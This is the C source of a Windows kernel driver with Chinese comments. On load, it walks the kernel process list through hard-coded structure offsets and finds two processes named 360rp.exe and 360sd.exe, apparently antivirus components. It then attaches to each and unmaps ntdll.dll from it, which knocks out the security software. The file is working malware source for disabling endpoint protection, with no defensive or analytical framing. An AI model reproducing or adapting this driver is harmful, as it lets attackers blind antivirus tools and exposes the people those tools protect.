
#ifdef __cplusplus
extern "C" {
#endif
#include <ntifs.h>
#include <WinDef.h>
#include <ntddk.h>
#include <string.h>
#ifdef __cplusplus
}; // extern "C"
#endif


#include "Driver2.h"

#ifdef __cplusplus
namespace { // anonymous namespace to limit the scope of this global variable!
#endif
PDRIVER_OBJECT pdoGlobalDrvObj = 0;
#ifdef __cplusplus
}; // anonymous namespace
#endif


typedef PPEB (__stdcall *PFNPsGetProcessPeb)(PEPROCESS pEProcess);  

typedef ULONG   PPS_POST_PROCESS_INIT_ROUTINE;    

typedef struct _PEB_LDR_DATA {  
	BYTE       Reserved1[8];  
	PVOID      Reserved2[3];  
	LIST_ENTRY InMemoryOrderModuleList;  
} PEB_LDR_DATA, *PPEB_LDR_DATA;  

typedef struct _RTL_USER_PROCESS_PARAMETERS {  
	BYTE           Reserved1[16];  
	PVOID          Reserved2[10];  
	UNICODE_STRING ImagePathName;  
	UNICODE_STRING CommandLine;  
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;  

typedef struct _PEB {  
	BYTE                          Reserved1[2];  
	BYTE                          BeingDebugged;  
	BYTE                          Reserved2[1];  
	PVOID                         Reserved3[2];  
	PPEB_LDR_DATA                 Ldr;  
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;  
	BYTE                          Reserved4[104];  
	PVOID                         Reserved5[52];  
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  
	BYTE                          Reserved6[128];  
	PVOID                         Reserved7[1];  
	ULONG                         SessionId;  
} PEB, *PPEB;  

typedef struct _LDR_DATA_TABLE_ENTRY    
{    
	LIST_ENTRY InLoadOrderLinks;    
	LIST_ENTRY InMemoryOrderLinks;    
	LIST_ENTRY InInitializationOrderLinks;    
	PVOID DllBase;    
	PVOID EntryPoint;    
	DWORD SizeOfImage;    
	UNICODE_STRING FullDllName;    
	UNICODE_STRING BaseDllName;    
	DWORD Flags;    
	WORD LoadCount;    
	WORD TlsIndex;    
	LIST_ENTRY HashLinks;    
	PVOID SectionPointer;    
	DWORD CheckSum;    
	DWORD TimeDateStamp;    
	PVOID LoadedImports;    
	PVOID EntryPointActivationContext;    
	PVOID PatchInformation;    
}LDR_DATA_TABLE_ENTRY,*PLDR_DATA_TABLE_ENTRY; 


NTSTATUS DRIVER2_DispatchCreateClose(
    IN PDEVICE_OBJECT		DeviceObject,
    IN PIRP					Irp
    )
{
    NTSTATUS status = STATUS_SUCCESS;
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DRIVER2_DispatchDeviceControl(
    IN PDEVICE_OBJECT		DeviceObject,
    IN PIRP					Irp
    )
{
    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

    switch(irpSp->Parameters.DeviceIoControl.IoControlCode)
    {
    case IOCTL_DRIVER2_OPERATION:
        // status = SomeHandlerFunction(irpSp);
        break;
    default:
        Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
        Irp->IoStatus.Information = 0;
        break;
    }

    status = Irp->IoStatus.Status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID DRIVER2_DriverUnload(
    IN PDRIVER_OBJECT		DriverObject
    )
{
    PDEVICE_OBJECT pdoNextDeviceObj = pdoGlobalDrvObj->DeviceObject;
    IoDeleteSymbolicLink(&usSymlinkName);

    // Delete all the device objects
    while(pdoNextDeviceObj)
    {
        PDEVICE_OBJECT pdoThisDeviceObj = pdoNextDeviceObj;
        pdoNextDeviceObj = pdoThisDeviceObj->NextDevice;
        IoDeleteDevice(pdoThisDeviceObj);
    }
}
extern "C"
NTSTATUS 
MmUnmapViewOfSection( 
					 IN PEPROCESS Process, 
					 IN ULONG BaseAddress 
					 ); 

NTSTATUS ScanProcessModule()
{
	PEPROCESS eprocess,Firsteprocess;
	ULONG ulProcessName;
	ULONG ulProcessID;

	KdPrint(("start ScanProcessModile\n"));
	//__asm int 3;
	eprocess = PsGetCurrentProcess();

	Firsteprocess = eprocess;
	if (eprocess == 0)
	{
		KdPrint(("PsGetCurrentProcess error"));
		return STATUS_SUCCESS;
	}
			PEPROCESS eprocess2;

	while (eprocess != NULL)
	{
		ulProcessName = (ULONG)eprocess + 0x174;		//	 +0x174 ImageFileName    : [16] UChar
		ulProcessID = *(ULONG*)((ULONG)eprocess + 0x84);//   +0x084 UniqueProcessId  : Ptr32 Void
		KdPrint(("processname = %s,processid = %d \r \n",ulProcessName,ulProcessID));
		

 		if (!strcmp( (char*)(ULONG*)ulProcessName ,"360rp.exe") || !strcmp( (char*)(ULONG*)ulProcessName ,"360sd.exe"))
		{
 			PsLookupProcessByProcessId((HANDLE)ulProcessID,&eprocess2);
			UNICODE_STRING uniPsGetProcessPeb;
			RtlInitUnicodeString(&uniPsGetProcessPeb,L"PsGetProcessPeb");

			PFNPsGetProcessPeb PsGetProcessPebAddr = (PFNPsGetProcessPeb)MmGetSystemRoutineAddress(&uniPsGetProcessPeb);
			if (PsGetProcessPebAddr == NULL)    
			{    
				KdPrint(("Get PsGetProcessPeb Failed~!\n"));    
				return STATUS_UNSUCCESSFUL;    
			}    
			PPEB pPEB = NULL;    
			pPEB = PsGetProcessPebAddr(eprocess2);  
			if (pPEB == NULL)    
			{    
				KdPrint(("Get pPEB Failed~!\n"));    
				return STATUS_UNSUCCESSFUL;    
			}   
			//保存APC状态  APC，即Asynchronous procedure call，异步程序调用  
			KAPC_STATE KAPC ={0};    
			//附加到进程    
			KeStackAttachProcess(eprocess2, &KAPC);    

			//是否已经附加到进程    
			BOOLEAN bIsAttached = FALSE;    

			bIsAttached = TRUE;    

			//指向LDR    
			//LDR数据结构    
			PPEB_LDR_DATA pPebLdrData = NULL;     
			pPebLdrData = pPEB->Ldr;    

			//链表头节点、尾节点    
			PLIST_ENTRY pListEntryStart = NULL;    
			PLIST_ENTRY pListEntryEnd = NULL;    
			//头节点、尾节点    
			pListEntryStart = pListEntryEnd = pPebLdrData->InMemoryOrderModuleList.Flink;    


			//开始遍历_LDR_DATA_TABLE_ENTRY    
			//LDR链表入口    
			PLDR_DATA_TABLE_ENTRY pLdrDataEntry = NULL;     
			do      
			{      
				//通过_LIST_ENTRY的Flink成员获取_LDR_DATA_TABLE_ENTRY结构     

				pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pListEntryStart,LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);      

				//输出DLL全路径    
				KdPrint(("%wZ \n", &pLdrDataEntry->FullDllName));    
				UNICODE_STRING uniNtdll;
				RtlInitUnicodeString(&uniNtdll,L"ntdll.dll");

				if (RtlEqualUnicodeString(&pLdrDataEntry->BaseDllName,&uniNtdll,TRUE))
				{
					MmUnmapViewOfSection(eprocess2,(ULONG)(pLdrDataEntry->DllBase));
					KdPrint(("卸载 ntdll.dll 完成"));  
				}
				pListEntryStart = pListEntryStart->Flink;      

			}while(pListEntryStart != pListEntryEnd);      

			//Detach进程    
			if (bIsAttached != FALSE)    
			{    
				KeUnstackDetachProcess(&KAPC);    
			}    

			//减少引用计数    
			if (eprocess2 != NULL)    
			{    
				ObDereferenceObject(eprocess2);    
				eprocess2 = NULL;    
			}    

			
			
 		}
		
														//   +0x088 ActiveProcessLinks : _LIST_ENTRY
		eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + 0x88) - 0x88);//-0x88是得到 eprocess结构

		if (eprocess == Firsteprocess || (*(LONG*)( (LONG)eprocess + 0x84) ) <0)//如果链表搜索完毕或者进程PID小于0则结束
		{
			break;
		}
	}
	return STATUS_SUCCESS;
}

#ifdef __cplusplus
extern "C" {
#endif
NTSTATUS DriverEntry(
    IN OUT PDRIVER_OBJECT   DriverObject,
    IN PUNICODE_STRING      RegistryPath
    )
{
    PDEVICE_OBJECT pdoDeviceObj = 0;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    pdoGlobalDrvObj = DriverObject;

	KdPrint(("welcome my driver\n"));
    // Create the device object.
    if(!NT_SUCCESS(status = IoCreateDevice(
        DriverObject,
        0,
        &usDeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pdoDeviceObj
        )))
    {
        // Bail out (implicitly forces the driver to unload).
        return status;
    };

    // Now create the respective symbolic link object
    if(!NT_SUCCESS(status = IoCreateSymbolicLink(
        &usSymlinkName,
        &usDeviceName
        )))
    {
        IoDeleteDevice(pdoDeviceObj);
        return status;
    }

    // NOTE: You need not provide your own implementation for any major function that
    //       you do not want to handle. I have seen code using DDKWizard that left the
    //       *empty* dispatch routines intact. This is not necessary at all!
    DriverObject->MajorFunction[IRP_MJ_CREATE] =
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DRIVER2_DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DRIVER2_DispatchDeviceControl;
    DriverObject->DriverUnload = DRIVER2_DriverUnload;


	ScanProcessModule();

    return STATUS_SUCCESS;
}
#ifdef __cplusplus
}; // extern "C"
#endif
